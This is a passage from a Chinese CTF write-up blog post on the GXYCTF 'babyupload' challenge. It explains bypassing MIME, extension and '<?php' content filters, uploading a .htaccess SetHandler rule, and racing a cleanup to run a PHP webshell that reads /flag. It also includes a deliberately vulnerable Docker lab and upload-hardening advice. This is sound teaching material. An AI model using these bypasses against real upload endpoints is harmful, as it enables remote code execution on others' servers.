+</thead>
+<tbody><tr>
+<td>同一个 <code>Session</code></td>
+<td>保证两个文件同目录</td>
+</tr>
+<tr>
+<td>上传后立刻访问</td>
+<td>抢在清理之前</td>
+</tr>
+<tr>
+<td>外层重试 30 次</td>
+<td>单次失败不影响整体</td>
+</tr>
+<tr>
+<td>随机文件名</td>
+<td>避免旧文件&#x2F;缓存干扰</td>
+</tr>
+<tr>
+<td><code>?t=随机数</code></td>
+<td>绕过 URL 缓存</td>
+</tr>
+<tr>
+<td>目录一致性检查</td>
+<td>避免“上传成功但 .htaccess 管不到”</td>
+</tr>
+</tbody></table>
+<p>如果网络很慢，3 秒窗口可能不够。这时可以：</p>
+<ul>
+<li>减少不必要的请求（不要先探测目录）；</li>
+<li>用更短的 payload；</li>
+<li>把 <code>.htaccess</code> 和木马的上传合并成一次请求（如果服务端支持多文件字段）；</li>
+<li>换一个网络环境更好的节点。</li>
+</ul>
+<h3 id="8-如果-htaccess-走不通"><a href="#8-如果-htaccess-走不通" class="headerlink" title="8. 如果 .htaccess 走不通"></a>8. 如果 .htaccess 走不通</h3><p>不是所有题都允许 <code>.htaccess</code>。常见替代思路：</p>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>替代方案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>黑名单漏了某个可执行后缀</td>
+<td>直接传 <code>.phtml</code>、<code>.pht</code>、<code>.php5</code> 等</td>
+</tr>
+<tr>
+<td>Apache 但 <code>AllowOverride None</code></td>
+<td>找已有的可执行目录、利用其他解析漏洞</td>
+</tr>
+<tr>
+<td>Nginx + PHP-FPM</td>
+<td>找 <code>user.ini</code> &#x2F; <code>.user.ini</code>、<code>fastcgi_split_path_info</code> 解析漏洞</td>
+</tr>
+<tr>
+<td>上传目录禁止执行</td>
+<td>尝试路径穿越、软链接、其他写文件点</td>
+</tr>
+<tr>
+<td>有文件包含点</td>
+<td>把图片当 PHP 包含，配合 <code>auto_prepend_file</code></td>
+</tr>
+</tbody></table>
+<p>本题的路线是“<code>.htaccess</code> 接管解析”，但核心问题始终是：<strong>能不能让服务端把上传的文件当代码执行。</strong></p>
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><div class="note info flat"><p><strong>Q1：为什么直接传 <code>.png</code> 会提示“上传类型也太露骨了吧”？</strong></p>
+<p>服务端检查的是请求里的 <code>Content-Type</code>，而且大概率只认 <code>image/jpeg</code>。浏览器给 <code>.png</code> 填的是 <code>01-upload-form.png</code>，所以被拒。用 Burp 把 <code>Content-Type</code> 改成 <code>image/jpeg</code> 就能过。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q2：<code>Content-Type</code> 不是浏览器自动填的吗，为什么能改？</strong></p>
+<p>它是 <code>multipart/form-data</code> 请求体里的一个普通字段，和 <code>filename</code> 一样由客户端填写。浏览器只是“默认帮你填”，用 Burp、<code>curl -F</code>、Python <code>requests</code> 都能随意改。服务端如果只读这个值，等于没有校验。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q3：为什么 <code>&lt;?php</code> 被拦，<code>&lt;script language=&quot;php&quot;&gt;</code> 却不被拦？</strong></p>
+<p>内容黑名单匹配的是 <code>&lt;?php</code> 这个标记，不是单独的 <code>php</code> 三个字母。<code>&lt;script language=&quot;php&quot;&gt;</code> 里虽然有 <code>php</code>，但没有 <code>&lt;?php</code>，所以能过。<code>&lt;?</code> 短标签也能过，因为它同样不含 <code>&lt;?php</code>。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q4：<code>&lt;?</code> 短标签上传成功了，为什么访问没执行？</strong></p>
+<p><code>&lt;?</code> 能不能执行取决于 PHP 的 <code>short_open_tag</code> 配置。很多环境默认关闭，短标签会被当成普通文本。本题服务器是 PHP 5.6，最终脚本改用 <code>&lt;script language=&quot;php&quot;&gt;</code>，这个标签在 PHP 5 里不依赖 <code>short_open_tag</code>，更稳。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q5：上传成功但访问是源码&#x2F;404&#x2F;空白，怎么办？</strong></p>
+<p>先分清三种情况：</p>
+<ul>
+<li><strong>源码</strong>：文件被当静态文本返回，说明没有执行；</li>
+<li><strong>404</strong>：路径不对，或者文件已经被清理；</li>
+<li><strong>空白</strong>：可能执行了但没输出，也可能没执行。</li>
+</ul>
+<p>判断执行与否，最可靠的是放一个 <code>echo &quot;test123&quot;;</code>，访问后看页面有没有 <code>test123</code>；其次看响应头有没有 <code>X-Powered-By: PHP</code>。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q6：为什么一定要传 <code>.htaccess</code>，不能直接传 <code>.php</code>？</strong></p>
+<p><code>.php</code> 后缀在文件名黑名单里，传不上去。<code>.png</code> 能传，但默认不执行。<code>.htaccess</code> 的作用是<strong>改这个目录的解析规则</strong>，让 <code>.png</code> 也被 PHP 处理，从而绕过后缀限制。这是“换解析器”而不是“换后缀”。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q7：<code>.htaccess</code> 里的 handler 名写错了会怎样？</strong></p>
+<p>如果写成 <code>application/x-http-php</code>（少一个 <code>d</code>），Apache 找不到对应 handler，通常不报错，只是继续按静态文件处理。表现就是“<code>.htaccess</code> 传上去了，木马还是不执行”。正确写法是 <code>application/x-httpd-php</code>。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q8：为什么 <code>.htaccess</code> 和木马必须在同一个目录？</strong></p>
+<p><code>.htaccess</code> 只对所在目录及其子目录生效。如果两个文件落在不同目录，<code>.htaccess</code> 管不到木马，木马仍然按 <code>.png</code> 静态返回。本题上传目录和会话绑定，所以要共用 <code>Session</code>，并在脚本里检查两个路径的目录部分是否一致。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q9：为什么要重试 30 次？</strong></p>
+<p>因为上传目录大约每 3 秒清理一次。可能 <code>.htaccess</code> 刚传完就被删，也可能木马刚传完就被删，或者访问时刚好赶上清理。单次失败不代表思路错，重试能覆盖竞态窗口。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q10：为什么脚本要随机文件名和 <code>?t=随机数</code>？</strong></p>
+<p>随机文件名避免和旧文件&#x2F;缓存碰撞；<code>?t=</code> 让每次访问的 URL 不同，绕过 CDN、反向代理或浏览器缓存。否则可能访问到上一次的旧内容，误以为没执行。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q11：<code>SetHandler</code> 不生效怎么办？</strong></p>
+<p>按顺序排查：</p>
+<ol>
+<li><code>AllowOverride</code> 是不是 <code>None</code>；</li>
+<li>handler 名是不是 <code>application/x-httpd-php</code>；</li>
+<li>是 mod_php 还是 PHP-FPM（FPM 要换 handler 写法）；</li>
+<li>换 <code>AddHandler application/x-httpd-php .png</code> 或 <code>AddType application/x-httpd-php .png</code>；</li>
+<li>看访问目录是不是 500，500 通常是 <code>.htaccess</code> 语法或权限问题。</li>
+</ol>
+</div>
+
+<div class="note info flat"><p><strong>Q12：怎么确认木马真的执行了？</strong></p>
+<p>三个信号：</p>
+<ul>
+<li>页面出现你 <code>echo</code> 的字符串；</li>
+<li>响应头出现 <code>X-Powered-By: PHP/...</code>；</li>
+<li>读取 <code>/flag</code> 成功，页面出现 flag。</li>
+</ul>
+<p>如果只是“上传成功”，什么都不算。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q13：为什么直接访问 <code>/flag</code> 是 404？</strong></p>
+<p>flag 在文件系统根目录 <code>/flag</code>，不在 Web 根目录 <code>/var/www/html</code> 下。Web 服务器只暴露站点根目录，所以直接访问 <code>/flag</code> 找不到。木马执行后，PHP 进程有权限读文件系统，<code>file_get_contents(&quot;/flag&quot;)</code> 才能读到。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q14：本地怎么复现？</strong></p>
+<p>见下一节的 Docker 实验。核心是 Apache + mod_php + <code>AllowOverride All</code>，再加一个只检查 MIME&#x2F;文件名&#x2F;内容的 PHP 上传接口。本地不需要复现 3 秒清理，脚本把重试去掉也能跑通。</p>
+</div>
+
+<h2 id="本地复现实验（Docker-Apache-PHP-5-6）"><a href="#本地复现实验（Docker-Apache-PHP-5-6）" class="headerlink" title="本地复现实验（Docker + Apache + PHP 5.6）"></a>本地复现实验（Docker + Apache + PHP 5.6）</h2><p>在线靶场会失效，但这道题的四层检查和 <code>.htaccess</code> 接管可以在本地完整复现。</p>
+<p><strong>1. 目录结构</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">babyupload/</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── index.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. <code>Dockerfile</code></strong></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">5.6</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许 .htaccess 生效，并准备一个可写的上传目录</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -ri <span class="string">&#x27;s/AllowOverride None/AllowOverride All/g&#x27;</span> /etc/apache2/apache2.conf \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> -p /var/www/html/upload \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> 777 /var/www/html/upload \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;CTF2&#123;local_babyupload_demo&#125;&#x27;</span> &gt; /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> index.php /var/www/html/index.php</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3. <code>index.php</code>（模拟题目的四层检查）</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no file&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一层：只认 image/jpeg</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/jpeg&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;上传类型也太露骨了吧！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二层：文件名里的 ph 系列后缀</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.ph/i&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;后缀被拦&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三层：内容里的 &lt;?php 标记</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?php/i&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;诶，别蒙我啊，这标志明显还是php啊&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按会话生成上传目录</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/upload/&#x27;</span> . <span class="title function_ invoke__">session_id</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;move failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;/upload/&#x27;</span> . <span class="title function_ invoke__">session_id</span>() . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$name</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 启动</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t babyupload .</span><br><span class="line">docker run --<span class="built_in">rm</span> -p 8080:80 babyupload</span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 跑脚本</strong></p>
+<p>把脚本里的 <code>BASE</code> 改成 <code>http://127.0.0.1:8080</code>，运行后应该输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;local_babyupload_demo&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地的关键配置是：</p>
+<table>
+<thead>
+<tr>
+<th>配置</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>AllowOverride All</code></td>
+<td>让 <code>.htaccess</code> 生效</td>
+</tr>
+<tr>
+<td><code>php:5.6-apache</code></td>
+<td>支持 <code>&lt;script language=&quot;php&quot;&gt;</code></td>
+</tr>
+<tr>
+<td><code>chmod 777 upload</code></td>
+<td>让 <code>www-data</code> 能写目录</td>
+</tr>
+<tr>
+<td><code>/flag</code></td>
+<td>模拟文件系统根目录的 flag</td>
+</tr>
+</tbody></table>
+<div class="note info flat"><p><strong>拉不到 PHP 5.6 镜像怎么办？</strong></p>
+<p>可以换 <code>php:7.4-apache</code>，但 <code>&lt;script language=&quot;php&quot;&gt;</code> 在 PHP 7 已被移除。替代方案：</p>
+<ul>
+<li>木马改用 <code>&lt;? ... ?&gt;</code>；</li>
+<li>在 <code>.htaccess</code> 里加 <code>php_value short_open_tag 1</code>；</li>
+<li>确认 <code>AllowOverride</code> 允许 <code>php_value</code>（通常需要 <code>All</code>）。</li>
+</ul>
+<p>或者只在本机已有的 Apache + PHP 环境里验证 <code>.htaccess</code> 规则，不追求和靶场完全一致。</p>
+</div>
+
+<h2 id="完整流程速查"><a href="#完整流程速查" class="headerlink" title="完整流程速查"></a>完整流程速查</h2><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>目的</th>
+<th>操作 &#x2F; payload</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>找上传点</td>
+<td>看页面、抓包</td>
+<td>字段名 <code>uploaded</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>试 MIME</td>
+<td>直接传 <code>.png</code></td>
+<td>“上传类型也太露骨了吧！”</td>
+</tr>
+<tr>
+<td>3</td>
+<td>绕 MIME</td>
+<td>Burp 改 <code>Content-Type: image/jpeg</code></td>
+<td>文件落盘</td>
+</tr>
+<tr>
+<td>4</td>
+<td>试内容</td>
+<td>内容写 <code>&lt;?php ... ?&gt;</code></td>
+<td>“这标志明显还是php啊”</td>
+</tr>
+<tr>
+<td>5</td>
+<td>绕内容</td>
+<td>换 <code>&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></td>
+<td>上传成功</td>
+</tr>
+<tr>
+<td>6</td>
+<td>确认不执行</td>
+<td>访问 <code>.png</code></td>
+<td>源码 &#x2F; 空白 &#x2F; 下载</td>
+</tr>
+<tr>
+<td>7</td>
+<td>找服务器</td>
+<td>访问不存在的 <code>/flag</code></td>
+<td>404 页脚显示 Apache</td>
+</tr>
+<tr>
+<td>8</td>
+<td>传 <code>.htaccess</code></td>
+<td><code>SetHandler application/x-httpd-php</code></td>
+<td>上传成功</td>
+</tr>
+<tr>
+<td>9</td>
+<td>同目录</td>
+<td>同一 <code>Session</code> 传木马</td>
+<td>两个路径同目录</td>
+</tr>
+<tr>
+<td>10</td>
+<td>执行</td>
+<td>访问 <code>.png</code></td>
+<td>输出 flag</td>
+</tr>
+</tbody></table>
+<h2 id="顺手聊聊怎么防"><a href="#顺手聊聊怎么防" class="headerlink" title="顺手聊聊怎么防"></a>顺手聊聊怎么防</h2><p>这道题的防线几乎每一层都建在了“错误的地方”：检查 MIME 却信任客户端，拦后缀却放过 <code>.htaccess</code>，拦 <code>&lt;?php</code> 却不拦等价标签。真正靠谱的做法是：</p>
+<table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>★★★</td>
+<td><strong>上传目录禁止执行脚本</strong></td>
+<td><code>php_admin_flag engine off</code>、<code>RemoveHandler</code>、<code>Options -ExecCGI</code>，最根本</td>
+</tr>
+<tr>
+<td>★★★</td>
+<td><strong>文件存到 Web 根目录之外</strong></td>
+<td>通过下载接口读取，不直接暴露路径</td>
+</tr>
+<tr>
+<td>★★★</td>
+<td><strong>白名单后缀 + 服务端真实类型校验</strong></td>
+<td><code>finfo_file()</code> &#x2F; <code>getimagesize()</code>，不信任 <code>$_FILES[&#39;type&#39;]</code></td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>重命名文件、去除可执行后缀</strong></td>
+<td>随机名 + 固定安全后缀，别保留用户文件名</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong><code>AllowOverride None</code></strong></td>
+<td>禁止用户上传的 <code>.htaccess</code> 生效</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>最小权限运行</strong></td>
+<td>Web 用户读不到 <code>/flag</code> 这类敏感文件</td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td><strong>内容黑名单 &#x2F; WAF</strong></td>
+<td>只能提高门槛，等价标签、编码、拼接都能绕</td>
+</tr>
+</tbody></table>
+<p>最关键的一条是：<strong>不要试图“过滤掉所有坏内容”，而是让上传目录里的文件根本没有机会被当成代码执行。</strong> 只要执行权限关死，传什么上去都只是文件。</p>
+<div class="note success flat"><p><strong>一条原则</strong>：文件上传的终点不是“上传成功”，而是“服务端按我的预期解析了这个文件”。防守方也一样——只要上传目录不执行脚本，攻击者传再多花样的文件也只是占磁盘。</p>
+</div>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题是一条很完整的文件上传链：</p>
+<ul>
+<li><strong>MIME 检查</strong>：只认 <code>image/jpeg</code>，但 <code>Content-Type</code> 是客户端可控的，Burp 一改就过；</li>
+<li><strong>后缀黑名单</strong>：拦了 <code>ph</code> 系列，但 <code>.png</code> 能过；而 <code>.png</code> 默认不执行，所以光过后缀没用；</li>
+<li><strong>内容黑名单</strong>：拦 <code>&lt;?php</code>，但 <code>&lt;script language=&quot;php&quot;&gt;</code> 和 <code>&lt;?</code> 都是等价写法；</li>
+<li><strong>解析接管</strong>：404 页面暴露 Apache，<code>.htaccess</code> 的 <code>SetHandler</code> 把整个目录交给 PHP，<code>.png</code> 也能执行；</li>
+<li><strong>同目录 + 同会话</strong>：<code>.htaccess</code> 只对所在目录生效，上传目录又和会话绑定，所以两次上传必须共用一个 <code>Session</code>；</li>
+<li><strong>竞态</strong>：3 秒清理逼着脚本“上传完立刻访问”，随机文件名和 <code>?t=</code> 用来避开缓存与旧文件。</li>
+</ul>
+<p>最后留一条经验：<strong>文件上传题先问“它检查了什么”，再问“它怎么解析”。</strong> 前者决定你能不能传上去，后者决定你传上去有没有用。只盯着后缀，很容易在第四层卡死。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Quellisya">Quellisya</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://quellisya.github.io/2026/11/18/web-ctf-upload-babyupload/">https://quellisya.github.io/2026/11/18/web-ctf-upload-babyupload/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Quellisya.github.io" target="_blank">Quellisya's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/GXYCTF/">GXYCTF</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/htaccess/">.htaccess</a><a class="post-meta__tags" href="/tags/PHP-%E7%9F%AD%E6%A0%87%E7%AD%BE/">PHP 短标签</a><a class="post-meta__tags" href="/tags/MIME-%E4%BC%AA%E9%80%A0/">MIME 伪造</a><a class="post-meta__tags" href="/tags/SetHandler/">SetHandler</a><a class="post-meta__tags" href="/tags/%E4%B8%8A%E4%BC%A0%E7%AB%9E%E6%80%81/">上传竞态</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-seal.svg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/11/17/pwn-ctf-format-string-pwn5/" title="Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system</div></div><div class="info-2"><div class="info-item-1">从 printf(buf) 这个经典写法出发，讲清楚格式化字符串怎么读栈、怎么用 %p 找偏移、怎么用 %n/%hhn 写内存；再结合 Partial RELRO 和 GOT/PLT，把 atoi@got 改成 system@plt，第二次输入 /bin/sh 就能在条件判断里直接拿到 shell。附手动构造 payload 的字节计数过程，以及另一条“泄漏随机数”的解法。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/10/24/web-knowledge-upload-basics/" title="文件上传基础：校验点、可执行后缀与常见坑"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-24</div><div class="info-item-2">文件上传基础：校验点、可执行后缀与常见坑</div></div><div class="info-2"><div class="info-item-1">文件上传题的通用知识：漏洞从哪来、前端校验为什么不算防线、服务端会在哪些地方拦、哪些后缀可能被解析，外加 8 个新手常踩的坑和完整流程速查。</div></div></div></a><a class="pagination-related" href="/2026/10/24/web-ctf-upload-actf2020/" title="[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-24</div><div class="info-item-2">[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml</div></div><div class="info-2"><div class="info-item-1">前端校验、后缀黑名单都试过之后，把后缀换成 .phtml 并把 .htaccess 传上去，让服务器认这个后缀，最后拿到 flag。</div></div></div></a><a class="pagination-related" href="/2026/10/24/web-ctf-upload-geek2019/" title="[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-24</div><div class="info-item-2">[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过</div></div><div class="info-2"><div class="info-item-1">后缀黑名单、Content-Type、文件头、内容黑名单四层检查，全靠加一个 GIF89a 文件头和改用 PHP 的 script language=php 老式标签绕过。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Quellisya</div><div class="author-info-description">记录 CTF 与 Web 安全的学习笔记，把每一步讲清楚。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Quellisya" target="_blank" title="Github"><i class="fab fa-github" style="color: #0f2f32;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">循墨迹读代码，借微光见漏洞。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%9C%B4%E7%B4%A0%E7%9A%84%E4%B8%8A%E4%BC%A0%E6%A1%86"><span class="toc-text">题目：一个朴素的上传框</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9AMIME-%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%9F%A5"><span class="toc-text">第一层：MIME 类型检查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-MIME-%E6%A3%80%E6%9F%A5%E9%9D%A0%E4%B8%8D%E4%BD%8F"><span class="toc-text">为什么 MIME 检查靠不住</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9A%E6%96%87%E4%BB%B6%E5%90%8D%E5%92%8C%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">第二层：文件名和后缀黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9A%E5%86%85%E5%AE%B9%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">第三层：内容黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%B8%A6%E8%A1%A5%E4%B8%80%E5%BC%A0-PHP-%E5%BC%80%E6%A0%87%E7%AD%BE%E8%A1%A8"><span class="toc-text">顺带补一张 PHP 开标签表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%B1%82%EF%BC%9A%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%EF%BC%8C%E4%BD%86-png-%E4%B8%8D%E4%BC%9A%E6%89%A7%E8%A1%8C"><span class="toc-text">第四层：上传成功，但 .png 不会执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%B1%82%EF%BC%9A%E4%BB%8E-404-%E9%A1%B5%E9%9D%A2%E5%8F%91%E7%8E%B0-Apache"><span class="toc-text">第五层：从 404 页面发现 Apache</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 